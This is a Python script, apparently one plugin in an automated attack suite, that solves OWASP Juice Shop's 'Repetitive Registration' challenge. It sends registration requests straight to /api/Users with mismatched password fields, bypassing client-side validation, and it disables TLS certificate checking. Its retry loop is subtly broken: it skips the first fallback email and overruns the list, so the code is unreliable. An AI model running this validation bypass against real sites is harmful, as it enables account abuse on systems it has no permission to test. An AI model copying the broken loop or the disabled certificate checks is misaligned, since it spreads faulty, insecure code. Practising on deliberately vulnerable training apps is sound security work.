"""
This file is used to solve the OWASP Juice-shop Task REPETITIVE REGISTRATION
Principle: If we have successfully repeated our password, we can change the first password
Methodology: If we are using request, we can avoid the checking.
"""

import requests

from plugins import attack as a
from .header_config import *
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class test_repetitive_registration(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/api/Users'

    def generator(self):
        #cookies = a.load_cookie()

        headers = HEADER

        json_data = {
            'email': 'testeee@gmail.com', # remark: you need to creat a new email each time!!
            'password': '123456',
            'passwordRepeat': '12345',
            'securityQuestion': {
                'id': 2,
                'question': 'Mother\'s maiden name?',
            },
            'securityAnswer': 'test',
        }

        return headers, json_data

    def run(self):
        headers, json_data = self.generator()
        response = a.requests.post(self.url, headers=headers, json=json_data, verify=False)
        print(response.status_code)
        ## ensure the email is not login
        email_list = ['test8100e@gmail.com', 'test8e99@gmail.com', 'test8e98@gmail.com'
                      ,'test77777@gmail.com']
        idx = 0
        while ( (response.status_code != 201) and (idx < len(email_list)) ):
            idx += 1
            json_data['email'] = email_list[idx]
            response = a.requests.post(self.url, headers=headers, json=json_data, verify=False)
        print(response.status_code)
        ## load cookie
        if response.status_code == 201:
            res_payload_dict = response.json()
            print("response begin")
            print(response.text)
            print("response end")
            """
            new_token = res_payload_dict["authentication"]['token']
            print(new_token)
            new_cookie = a.COOKIE
            new_cookie["token"] = new_token
            a.write_cookie(new_cookie)
            """







